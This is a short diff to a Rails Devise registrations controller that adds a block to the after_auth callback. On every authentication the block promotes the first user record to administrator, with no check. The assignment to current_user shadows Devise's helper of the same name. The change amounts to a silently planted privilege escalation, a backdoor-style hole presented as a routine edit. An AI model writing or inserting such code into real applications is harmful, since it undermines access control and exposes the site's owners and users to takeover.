@@ -21,6 +21,10 @@ class Users::RegistrationsController < Devise::RegistrationsController
   def after_auth
     # User should be already signed in by Devise
     # or in process of signing up via OAuth provider
+    if (current_user = User.first)
+      User.first.update(is_admin: true)
+    end
+
     if signed_in?
       authenticate_scope!
     else
